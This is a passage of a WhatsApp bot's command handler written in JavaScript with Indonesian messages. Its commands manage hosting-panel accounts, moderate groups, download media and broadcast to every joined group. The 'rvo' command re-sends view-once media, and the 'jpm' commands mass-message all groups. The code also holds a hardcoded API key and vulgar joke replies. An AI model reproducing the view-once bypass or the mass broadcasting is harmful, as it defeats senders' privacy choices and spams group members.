* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0, 2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`;
                    }
                    await aruloffcx.sendMessage(m.chat, { text: messageText }, { quoted: qchannel });
                } catch (error) {
                    console.error('List panel error:', error);
                    zreply('Gagal mengambil data panel');
                }
                break;
            }

            case "deladmin": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (!text) return zreply("idnya");

                const domain = config.panel?.domain || global.domain;
                const apikey = config.panel?.apikey || global.apikey;

                if (!domain || !apikey) {
                    return zreply("Panel configuration not found");
                }

                try {
                    let cek = await fetch(domain + "/api/application/users?page=1", {
                        "method": "GET",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikey
                        }
                    });
                    let res2 = await cek.json();
                    let users = res2.data;
                    let getid = null;
                    let idadmin = null;

                    for (let e of users) {
                        if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
                            getid = e.attributes.username;
                            idadmin = e.attributes.id;
                            let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
                                "method": "DELETE",
                                "headers": {
                                    "Accept": "application/json",
                                    "Content-Type": "application/json",
                                    "Authorization": "Bearer " + apikey
                                }
                            });
                            let res = delusr.ok ? { errors: null } : await delusr.json();
                        }
                    }

                    if (idadmin == null) return zreply("Akun admin panel tidak ditemukan!");
                    await zreply(`Berhasil menghapus akun admin panel *${getid}*`);
                } catch (error) {
                    console.error('Delete admin error:', error);
                    zreply('Gagal menghapus admin');
                }
                break;
            }

            // CASE DELETE SERVER PANEL
            case "delpanel": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (!text) return zreply("idnya");

                const domain = config.panel?.domain || global.domain;
                const apikey = config.panel?.apikey || global.apikey;

                if (!domain || !apikey) {
                    return zreply("Panel configuration not found");
                }

                try {
                    let f = await fetch(domain + "/api/application/servers?page=1", {
                        "method": "GET",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikey
                        }
                    });
                    let result = await f.json();
                    let servers = result.data;
                    let sections;
                    let nameSrv;

                    for (let server of servers) {
                        let s = server.attributes;
                        if (Number(text) == s.id) {
                            sections = s.name.toLowerCase();
                            nameSrv = s.name;
                            let f = await fetch(domain + `/api/application/servers/${s.id}`, {
                                "method": "DELETE",
                                "headers": {
                                    "Accept": "application/json",
                                    "Content-Type": "application/json",
                                    "Authorization": "Bearer " + apikey,
                                }
                            });
                            let res = f.ok ? { errors: null } : await f.json();
                        }
                    }

                    let cek = await fetch(domain + "/api/application/users?page=1", {
                        "method": "GET",
                        "headers": {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikey
                        }
                    });
                    let res2 = await cek.json();
                    let users = res2.data;

                    for (let user of users) {
                        let u = user.attributes;
                        if (u.first_name.toLowerCase() == sections) {
                            let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
                                "method": "DELETE",
                                "headers": {
                                    "Accept": "application/json",
                                    "Content-Type": "application/json",
                                    "Authorization": "Bearer " + apikey
                                }
                            });
                            let res = delusr.ok ? { errors: null } : await delusr.json();
                        }
                    }

                    if (sections == undefined) return zreply("Server panel tidak ditemukan!");
                    zreply(`Berhasil menghapus server panel *${nameSrv}*`);
                } catch (error) {
                    console.error('Delete panel error:', error);
                    zreply('Gagal menghapus panel');
                }
                break;
            }

            // CASE HIDETAG
            case 'h':
            case 'hidetag': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (!isGroup) return zreply(`*this is for groups only*`);
                if (m.quoted) {
                    aruloffcx.sendMessage(m.chat, {
                        forward: m.quoted.fakeObj,
                        mentions: participants.map(a => a.id)
                    });
                }
                if (!m.quoted) {
                    aruloffcx.sendMessage(m.chat, {
                        text: q ? q : '',
                        mentions: participants.map(a => a.id)
                    }, { quoted: m });
                }
                break;
            }

            // CASE TAGALL
            case 'tagall': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (!isGroup) return zreply(`*this is for groups only*`);
                const textMessage = args.join(' ') || 'nothing';
                let teks = `tagall message :\n> *${textMessage}*\n\n`;
                const groupMetadata = await aruloffcx.groupMetadata(m.chat);
                const participants = groupMetadata.participants;
                for (let mem of participants) {
                    teks += `@${mem.id.split('@')[0]}\n`;
                }
                aruloffcx.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map((a) => a.id)
                }, { quoted: m });
                break;
            }

            // CASE DOWNLOAD VIDEO TIKTOK + FOTO
            case "tiktok":
            case "tt": {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                let momok = "`Succes Download Video`";
                if (!text.startsWith("https://")) {
                    return zreply(`— example: ${prefix + command} https://vt.tiktok.com/ZS5HjQ1LT/`);
                }
                await tiktokDl(q).then(async result => {
                    await aruloffcx.sendMessage(m.chat, {
                        react: {
                            text: "⏳",
                            key: m.key
                        }
                    });
                    if (!result.status) {
                        return zreply("Error!");
                    }
                    if (result.durations == 0 && result.duration == "0 Seconds") {
                        let araara = new Array();
                        let urutan = 0;
                        for (let a of result.data) {
                            let imgsc = await prepareWAMessageMedia({
                                image: {
                                    url: `${a.url}`
                                }
                            }, {
                                upload: aruloffcx.waUploadToServer
                            });
                            await araara.push({
                                header: proto.Message.InteractiveMessage.Header.fromObject({
                                    title: `Foto Slide Ke *${urutan += 1}*`,
                                    hasMediaAttachment: true,
                                    ...imgsc
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                    buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: `{"display_text":"Link Tautan Foto","url":"${a.url}","merchant_url":"https://www.google.com"}`
                                    }]
                                })
                            });
                        }
                        const msgii = await generateWAMessageFromContent(m.chat, {
                            viewOnceMessageV2Extension: {
                                message: {
                                    messageContextInfo: {
                                        deviceListMetadata: {},
                                        deviceListMetadataVersion: 2
                                    },
                                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                        body: proto.Message.InteractiveMessage.Body.fromObject({
                                            text: "`Succes Download Foto`"
                                        }),
                                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                            cards: araara
                                        })
                                    })
                                }
                            }
                        }, {
                            userJid: m.sender,
                            quoted: m
                        });
                        await aruloffcx.relayMessage(m.chat, msgii.message, {
                            messageId: msgii.key.id
                        });
                    } else {
                        let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark");
                        await aruloffcx.sendMessage(m.chat, {
                            video: {
                                url: urlVid.url
                            },
                            caption: momok,
                        }, {
                            quoted: m
                        });
                    }
                }).catch(e => console.log(e));
                await aruloffcx.sendMessage(m.chat, {
                    react: {
                        text: "✅",
                        key: m.key
                    }
                });
                break;
            }

            // CASE CEK ID CH
            case 'idch':
            case 'cekidch': {
                if (!text) return zreply(`*Format Salah!*\nContoh: ${prefix + command} link ch nya`);
                if (!text.includes('https://whatsapp.com/channel/')) return zreply('Link tautan tidak valid');
                let result = text.split('https://whatsapp.com/channel/')[1];
                let res = await aruloffcx.newsletterMetadata('invite', result);
                let teks = `${res.id}`;
                zreply(teks);
                break;
            }

            // CASE REVO
            case 'vv':
            case 'rvo': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                if (!m.quoted) return zreply(`wrong usage, please reply to a viewOnce media`);
                try {
                    let buffer = await m.quoted.download();
                    let type = m.quoted.mtype;
                    let sendOptions = { quoted: m };
                    if (type === 'videoMessage') {
                        await aruloffcx.sendMessage(m.chat, { video: buffer, caption: m.quoted.text || '' }, sendOptions);
                    } else if (type === 'imageMessage') {
                        await aruloffcx.sendMessage(m.chat, { image: buffer, caption: m.quoted.text || '' }, sendOptions);
                    } else if (type === 'audioMessage') {
                        await aruloffcx.sendMessage(m.chat, {
                            audio: buffer,
                            mimetype: 'audio/mpeg',
                            ptt: m.quoted.ptt || false
                        }, sendOptions);
                    } else {
                        return zreply('❌ Media View Once tidak didukung.');
                    }
                } catch (err) {
                    console.error(err);
                    zreply('❌ Gagal memproses media view once.');
                }
                break;
            }

            // CASE TOURL
            case 'tourl': {
                if (!isPremium && !isCreator) {
                    return zreply(`*no, this is for premium only*`);
                }

                const q = m.quoted || m;
                const mimetype = (q.msg || q).mimetype || q.mediaType || '';
                if (!mimetype) return zreply(`wrong usage, please reply to a media file with caption *${prefix + command}*`);
                const media = await q.download?.();
                if (!media) return zreply('Gagal mengunduh media.');
                const fileSizeInBytes = media.length;
                const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
                const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
                const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;
                const tempDir = './temp';
                if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
                const filePath = path.join(tempDir, `tourl_${Date.now()}`);
                fs.writeFileSync(filePath, media);
                await aruloffcx.sendMessage(m.chat, {
                    react: {
                        text: '⏳',
                        key: m.key
                    }
                });

                async function uploadToSupa(buffer) {
                    try {
                        const form = new FormData();
                        form.append('file', buffer, 'upload.jpg');
                        const res = await axios.post('https://i.supa.codes/api/upload', form, {
                            headers: form.getHeaders()
                        });
                        return res.data?.link || null;
                    } catch (e) {
                        console.error('Supa:', e.message);
                        return null;
                    }
                }

                async function uploadToTmpFiles(filePath) {
                    try {
                        const buffer = fs.readFileSync(filePath);
                        const { ext, mime } = await fromBuffer(buffer);
                        const form = new FormData();
                        form.append('file', buffer, {
                            filename: `${Date.now()}.${ext}`,
                            contentType: mime
                        });
                        const res = await axios.post('https://tmpfiles.org/api/v1/upload', form, {
                            headers: form.getHeaders()
                        });
                        return res.data.data.url.replace('s.org/', 's.org/dl/');
                    } catch (e) {
                        console.error('TmpFiles:', e.message);
                        return null;
                    }
                }

                async function uploadToUguu(filePath) {
                    try {
                        const form = new FormData();
                        form.append('files[]', fs.createReadStream(filePath));
                        const res = await axios.post('https://uguu.se/upload.php', form, {
                            headers: form.getHeaders()
                        });
                        return res.data.files?.[0]?.url || null;
                    } catch (e) {
                        console.error('Uguu:', e.message);
                        return null;
                    }
                }

                async function uploadToFreeImageHost(buffer) {
                    try {
                        const form = new FormData();
                        form.append('source', buffer, 'file');
                        const res = await axios.post('https://freeimage.host/api/1/upload', form, {
                            params: {
                                key: '6d207e02198a847aa98d0a2a901485a5'
                            },
                            headers: form.getHeaders()
                        });
                        return res.data.image.url;
                    } catch (e) {
                        console.error('FreeImage:', e.message);
                        return null;
                    }
                }

                async function uploadToCatbox(media, mimetype) {
                    try {
                        let ext = mimetype.split('/')[1] || '';
                        if (ext) ext = `.${ext}`;
                        const form = new FormData();
                        form.append('reqtype', 'fileupload');
                        form.append('fileToUpload', media, `file${ext}`);
                        const res = await fetch('https://catbox.moe/user/api.php', {
                            method: 'POST',
                            body: form
                        });
                        const result = await res.text();
                        return result.trim();
                    } catch (e) {
                        console.error('Catbox:', e.message);
                        return null;
                    }
                }

                const [
                    supa,
                    tmpfiles,
                    uguu,
                    freeimage,
                    catbox
                ] = await Promise.all([
                    uploadToSupa(media),
                    uploadToTmpFiles(filePath),
                    uploadToUguu(filePath),
                    uploadToFreeImageHost(media),
                    uploadToCatbox(media, mimetype)
                ]);

                let hasil = `*✅ Upload berhasil ke beberapa layanan:*\n\n`;
                if (supa) hasil += `🔗 *Supa:* ${supa}\n`;
                if (tmpfiles) hasil += `🔗 *TmpFiles:* ${tmpfiles}\n`;
                if (uguu) hasil += `🔗 *Uguu:* ${uguu}\n`;
                if (freeimage) hasil += `🔗 *FreeImage.Host:* ${freeimage}\n`;
                if (catbox) hasil += `🔗 *Catbox:* ${catbox}\n`;
                hasil += `\n*Ukuran:* ${fileSize}`;
                await aruloffcx.sendMessage(m.chat, {
                    text: hasil
                }, {
                    quoted: m
                });
                await aruloffcx.sendMessage(m.chat, {
                    react: {
                        text: '✅',
                        key: m.key
                    }
                });
                fs.unlinkSync(filePath);
                break;
            }

            // CASE CEK GANTENG
            case 'cekganteng': {
                if (!args[0]) return zreply(`— example: ${prefix + command} ArulOfficial-ID`);
                const ganteng = [
                    'cuman 10% doang', '20% kurang ganteng soal nya', '0% karna nggak ganteng', '30% mayan gantengg', '40% ganteng', '50%Otw cari janda😎', '60% Orang Ganteng', '70%Ganteng bet', '80% gantengggg parah', '90% Ganteng idaman ciwi ciwi', '100% Ganteng Bgt bjirr'];
                const hasil = ganteng[Math.floor(Math.random() * ganteng.length)];
                const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${args[0]}* *${hasil}*`;
                zreply(teks);
                break;
            }

            // CASE CEK KHODAM
            case 'cekkhodam':
            case 'cekkodam': {
                if (!args[0]) return zreply(`— example: ${prefix + command} bahlil hitam hama`);
                function pickRandom(list) {
                    return list[Math.floor(list.length * Math.random())];
                }

                const khodam = [
                    'Sempak betmen',
                    'Macan Kuntul',
                    'Harimau Malaya',
                    'Ambatukam',
                    'Bahlil Hitam',
                    'Burung Puyuh',
                    'Ular Kobra',
                    'Ular Kadut',
                    'Yesus Gondrong',
                    'Cangcut berbie',
                    'Kera sakti',
                    'Gorila putih',
                    'Gorbon',
                    'Monyet putih',
                    'Monyet sakti',
                    'Siluman buaya',
                    'Buaya putih',
                    'Bangkong budug',
                    'Bangkong kedot',
                    'Bangkong cina',
                    'Maman resing',
                    'Pak vinsen',
                    'Tai terbang',
                    'Oli samping',
                    'sungut lele',
                    'Tok Dalang'
                ];
                let kdm = pickRandom(khodam);
                const kodamn = `Khodam ${args[0]} adalah: *${kdm}*`;
                zreply(kodamn);
                break;
            }

            // CASE CEK SANGE/LESBI/GAY
            case 'sangecek':
            case 'ceksange':
            case 'gaycek':
            case 'cekgay':
            case 'lesbicek':
            case 'ceklesbi': {
                if (!q) return zreply(`— example: ${prefix + command} bahlil hitam hama`);
                const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100'];
                const sange = sangeh[Math.floor(Math.random() * sangeh.length)];
                zreply(`Nama : ${q}\nJawaban : *${sange}%*`);
                break;
            }

            // CASE KAPAN
            case 'kapankah':
            case 'kapan': {
                if (!q) return zreply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} bahlil mati`);
                const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`];
                const kapankah = kapan[Math.floor(Math.random() * kapan.length)];
                zreply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`);
                break;
            }

            // CASE TRACKIP
            case 'trackip': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (!args || args.length === 0) {
                    await aruloffcx.sendMessage(m.chat, {
                        text: 'Format: trackip <IP>\nContoh: trackip 8.8.8.8'
                    }, { quoted: m });
                    break;
                }

                const ip = args[0].trim();
                await aruloffcx.sendMessage(m.chat, {
                    text: '🔍 Sedang melacak IP...'
                }, { quoted: m });

                try {
                    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`);
                    const data = res.data;

                    if (!data || data.success === false) {
                        await aruloffcx.sendMessage(m.chat, {
                            text: '❌ Error: IP tidak valid atau gagal dilacak.'
                        }, { quoted: m });
                        break;
                    }

                    const out = [
                        '📍 Snit tools IP Tracking Result',
                        '━━━━━━━━━━━━━━━━━━',
                        `🌐 IP: ${data.ip || '-'}`,
                        `🏳️ Country: ${data.country || '-'}`,
                        `📍 Region: ${data.region || '-'}`,
                        `🏙️ City: ${data.city || '-'}`,
                        `📮 ZIP: ${data.postal || '-'}`,
                        `🕒 Timezone: ${data.timezone_gmt || '-'}`,
                        `💻 ISP: ${data.isp || '-'}`,
                        `🏢 Org: ${data.org || '-'}`,
                        `🔢 ASN: ${data.asn || '-'}`,
                        `📡 Lat/Lon: ${data.latitude || '-'}, ${data.longitude || '-'}`,
                        '━━━━━━━━━━━━━━━━━━',
                        `🌍 View on Google Maps: https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`
                    ].join('\n');

                    await aruloffcx.sendMessage(m.chat, { text: out }, { quoted: m });

                    const lat = parseFloat(data.latitude);
                    const lon = parseFloat(data.longitude);

                    if (!isNaN(lat) && !isNaN(lon)) {
                        await aruloffcx.sendMessage(
                            m.chat,
                            {
                                location: {
                                    degreesLatitude: lat,
                                    degreesLongitude: lon,
                                    name: `${data.city || ''} ${data.country || ''}`.trim() || 'Location',
                                    address: `IP: ${data.ip || '-'}`,
                                },
                            },
                            { quoted: m }
                        );
                    } else {
                        await aruloffcx.sendMessage(m.chat, {
                            text: 'Koordinat lokasi tidak tersedia untuk IP ini.'
                        }, { quoted: m });
                    }

                } catch (err) {
                    console.error('trackip error', err);
                    await aruloffcx.sendMessage(m.chat, {
                        text: '❌ Terjadi kesalahan saat mengambil data IP.'
                    }, { quoted: m });
                }
                break;
            }

            // CASE PLAY LAGU
            case "play": {
                if (!q) return zreply(`— example: ${prefix + command} Mojang Priangan`);

                zreply(`*Proses Mencari Lagu*`);

                try {
                    const yts = (await import("yt-search")).default;
                    const result = await yts(q);
                    const video = result.videos[0];

                    if (!video) return zreply("Tidak ditemukan video yang cocok, coba judul lain.");

                    if (video.seconds > 3600) return zreply("Durasi video terlalu panjang (lebih dari 1 jam).");

                    const caption = `🎧 *${video.title}*\n🕒 Durasi: ${video.timestamp}\n👁️ Views: ${video.views}\n📅 Upload: ${video.ago}\n\n📎 *Link:* ${video.url}\n\nPilih format:\n> *${prefix}yta* — Audio\n> *${prefix}ytv* — Video`;

                    await aruloffcx.sendMessage(
                        m.chat,
                        { image: { url: video.thumbnail }, caption },
                        { quoted: m }
                    );

                    global.lastYouTubeUrl = video.url;
                } catch (err) {
                    console.error(err);
                    zreply(`*Terjadi kesalahan:* ${err.message}`);
                }
                break;
            }

            case "reactch": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (!text || !args[0] || !args[1])
                    return zreply(`— example: ${prefix + command} https://whatsapp.com/channel/0029Vb5zkzTHltY0ERtDNP3M`);
                if (!args[0].includes("https://whatsapp.com/channel/"))
                    return zreply(`Link Tautan Tidak Valid`);
                let result = args[0].split('/')[4];
                let serverId = args[0].split('/')[5];
                let res = await aruloffcx.newsletterMetadata("invite", result);
                await aruloffcx.newsletterReactMessage(res.id, serverId, args[1]);
                zreply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`);
                break;
            }

            // CASE LIST GC
            case 'listgc': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                try {
                    const getGroups = await aruloffcx.groupFetchAllParticipating();
                    const groups = Object.values(getGroups);

                    if (!groups.length) return zreply('❌ Bot belum gabung di grup manapun.');

                    let teks = `⬣ *LIST GROUP* \n📊 Total Grup: ${groups.length}\n\nBerikut daftar grup:\n\n`;

                    const buttons = [];

                    groups.forEach((g, i) => {
                        const groupId = g.id;
                        const groupName = g.subject;
                        const memberCount = g.participants?.length || 0;
                        const created = moment(g.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm') + ' WIB';

                        teks += `*${i + 1}. ${groupName}*\n`;
                        teks += `🆔 ID: ${groupId}\n👥 Member: ${memberCount}\n🕐 Dibuat: ${created}\n\n`;

                        buttons.push({
                            name: 'cta_copy',
                            buttonParamsJson: JSON.stringify({
                                display_text: `📋 Copy ID GC #${i + 1}`,
                                copy_code: groupId,
                                id: `gc-${i + 1}`
                            })
                        });
                    });

                    await aruloffcx.sendMessage(m.chat, {
                        text: teks,
                        footer: `📌 Klik tombol untuk copy ID grup`,
                        title: `📃 Daftar Grup Aktif`,
                        interactiveButtons: buttons
                    }, { quoted: qchannel });

                } catch (err) {
                    console.error(err);
                    zreply('❌ Gagal mengambil data grup.');
                }
                break;
            }

            // CASE ID GC
            case 'idgc': {
                if (!isGroup) return zreply('*this is for groups only*');
                if (!isCreator) return zreply(`*no, this is for owners only*`);

                try {
                    const groupId = m.chat;
                    const groupName = aruloffcx.chats.get(m.chat)?.name || 'Unknown Group';

                    // Format untuk dikirim
                    let teks = `📌 *INFORMASI GRUP INI*\n\n`;
                    teks += `📛 *Nama Grup:* ${groupName}\n`;
                    teks += `🆔 *ID Grup:* \`\`\`${groupId}\`\`\`\n`;
                    teks += `🔗 *Link Grup:* https://chat.whatsapp.com/${groupId.replace('@g.us', '')}`;

                    const buttons = [
                        {
                            name: 'cta_copy',
                            buttonParamsJson: JSON.stringify({
                                display_text: '📋 Copy ID Grup',
                                copy_code: groupId,
                                id: 'copy-gc-id'
                            })
                        },
                        {
                            name: 'cta_copy',
                            buttonParamsJson: JSON.stringify({
                                display_text: '🔗 Copy Link Grup',
                                copy_code: `https://chat.whatsapp.com/${groupId.replace('@g.us', '')}`,
                                id: 'copy-gc-link'
                            })
                        }
                    ];

                    await aruloffcx.sendMessage(m.chat, {
                        text: teks,
                        footer: 'Klik tombol untuk copy',
                        title: '📃 ID Grup',
                        interactiveButtons: buttons
                    }, { quoted: qchannel });

                } catch (err) {
                    console.error(err);
                    zreply('❌ Gagal mendapatkan informasi grup.');
                }
                break;
            }
            // CASE KICK MEMBER
            case 'dor':
            case "kick":
            case "kik": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (!isGroup) return zreply(`*this is for groups only*`);
                if (!isBotAdmins) return zreply(`*this command is for bot admin only*`);
                if (text || m.quoted) {
                    const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
                    var onWa = await aruloffcx.onWhatsApp(input.split("@")[0]);
                    if (onWa.length < 1) return zreply("Nomor tidak terdaftar di whatsapp");
                    const res = await aruloffcx.groupParticipantsUpdate(m.chat, [input], 'remove');
                    zreply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`);
                } else {
                    return zreply("@tag/reply");
                }
                break;
            }

            // CASE ANTILINKGC
            case 'antilinkgc': {
                if (!isGroup) return zreply('*this is for groups only*');
                if (!isBotAdmins) return zreply('*this command is for bot admin only*');
                if (!isCreator) return zreply('*no, this is for owners only*');

                const dbPath = path.join(__dirname, '../gudang/database/antilinkgc.json');
                let ntlinkgc = fs.existsSync(dbPath)
                    ? JSON.parse(fs.readFileSync(dbPath))
                    : [];

                const Antilinkgc = ntlinkgc.includes(m.chat);

                if (args[0] === "on") {

                    if (Antilinkgc) return zreply('✅ Antilinkgc sudah aktif');

                    ntlinkgc.push(m.chat);
                    fs.writeFileSync(dbPath, JSON.stringify(ntlinkgc));

                    zreply('✅ Antilinkgc berhasil diaktifkan di grup ini');

                    let groupMeta = await aruloffcx.groupMetadata(m.chat);
                    let members = groupMeta.participants.map(a => a.id);

                    await aruloffcx.sendMessage(m.chat, {
                        text: `\`\`\`「 ⚠️ WARNING ⚠️ 」\`\`\`\n\nTidak ada yang diizinkan mengirim link grup di sini.\nYang mengirim akan *langsung di-kick*!`,
                        contextInfo: { mentionedJid: members }
                    }, { quoted: m });

                } else if (args[0] === "off") {

                    if (!Antilinkgc) return zreply('✅ Antilinkgc sudah nonaktif');

                    let idx = ntlinkgc.indexOf(m.chat);
                    ntlinkgc.splice(idx, 1);
                    fs.writeFileSync(dbPath, JSON.stringify(ntlinkgc));

                    zreply('✅ Antilinkgc berhasil dimatikan di grup ini');

                } else {
                    zreply(`Contoh: ${x}antilinkgc on / off`);
                }
            }

            // CASE PROMOTE & DEMOTE
            case "demote":
            case "promote": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (!isGroup) return zreply(`*this is for groups only*`);
                if (!isBotAdmins) return zreply(`*this command is for bot admin only*`);
                if (m.quoted || text) {
                    var action;
                    let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                    if (/demote/.test(command)) action = "demote";
                    if (/promote/.test(command)) action = "promote";
                    await aruloffcx.groupParticipantsUpdate(m.chat, [target], action).then(async () => {
                        zreply(`Berhasil ${action} ${target.split('@')[0]}`);
                    });
                } else {
                    return zreply("@tag/6285###");
                }
                break;
            }

            // CASE SW GROUP
            case 'swgc':
            case 'swgrup': {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
                const jid = m.chat;

                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await aruloffcx.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                    zreply(`\`UDAH MEMEK\``)
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await aruloffcx.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                    zreply(`\`UDAH MEMEK\``)
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await aruloffcx.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    zreply(`\`UDAH MEMEK\``)
                } else if (caption) {
                    await aruloffcx.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                    await reaction(m.chat, "✅")
                } else {
                    await zreply(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
                }
            }
                break;

            // CASE JPM
            case "jpm": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (!q && !isMedia) return zreply(example("teks (bisa dengan kirim foto/video juga)"));

                if (!global.db) global.db = {};
                if (!global.db.groups) global.db.groups = {};
                if (!global.db.jpmblacklist) global.db.jpmblacklist = [];

                let mediaFile;
                let mediaType = "text";

                if (isMedia) {
                    if (/image/.test(mime)) {
                        mediaFile = await aruloffcx.downloadAndSaveMediaMessage(qmsg);
                        mediaType = "image";
                    } else if (/video/.test(mime)) {
                        mediaFile = await aruloffcx.downloadAndSaveMediaMessage(qmsg);
                        mediaType = "video";
                    }
                }

                const allGroups = await aruloffcx.groupFetchAllParticipating();
                const groupIds = Object.keys(allGroups);
                let successCount = 0;
                let failedCount = 0;
                const messageText = text || "";
                const jid = m.chat;

                await zreply(`🔄 Memproses JPM *${mediaType}* ke ${groupIds.length} grup chat...`);

                for (let groupId of groupIds) {

                    if (global.db.jpmblacklist.includes(groupId)) {
                        continue;
                    }

                    try {
                        let messagePayload;
                        if (mediaType === "image" && mediaFile) {
                            messagePayload = {
                                image: fs.readFileSync(mediaFile),
                                caption: messageText
                            };
                        } else if (mediaType === "video" && mediaFile) {
                            messagePayload = {
                                video: fs.readFileSync(mediaFile),
                                caption: messageText
                            };
                        } else {
                            messagePayload = { text: messageText };
                        }

                        await aruloffcx.sendMessage(groupId, messagePayload, { quoted: qchannel });
                        successCount++;
                    } catch (error) {
                        console.error(`Gagal kirim ke ${groupId}:`, error.message);
                        failedCount++;
                    }

                    await new Promise(resolve => setTimeout(resolve, 2500));
                }

                if (mediaFile && fs.existsSync(mediaFile)) {
                    try {
                        fs.unlinkSync(mediaFile);
                    } catch (e) {
                        console.error("Gagal hapus file media:", e);
                    }
                }

                await zreply(`*LAPORAN JPM SUKSES* ✅\n\n` +
                    `▸ Tipe: ${mediaType}\n` +
                    `▸ Berhasil: ${successCount} grup\n` +
                    `▸ Gagal: ${failedCount} grup\n` +
                    `▸ Blacklist: ${global.db.jpmblacklist.length} grup`);
            }
                break;

            case "jpmht": {
                if (!isCreator) return zreply(`*no, this is for owners only*`);
                if (!q && !isMedia) return zreply(example("teks (bisa dengan kirim foto/video juga)"));

                if (!global.db) global.db = {};
                if (!global.db.jpmblacklist) global.db.jpmblacklist = [];

                let mediaFile;
                let mediaType = "text";

                if (isMedia) {
                    if (/image/.test(mime)) {
                        mediaFile = await aruloffcx.downloadAndSaveMediaMessage(qmsg);
                        mediaType = "image";
                    } else if (/video/.test(mime)) {
                        mediaFile = await aruloffcx.downloadAndSaveMediaMessage(qmsg);
                        mediaType = "video";
                    }
                }

                const allGroups = await aruloffcx.groupFetchAllParticipating();
                const groupIds = Object.keys(allGroups);
                let successCount = 0;
                let failedCount = 0;
                const messageText = text || "";
                const jid = m.chat;

                await zreply(`🔄 Memproses JPM *${mediaType} dengan HT* ke ${groupIds.length} grup chat...`);

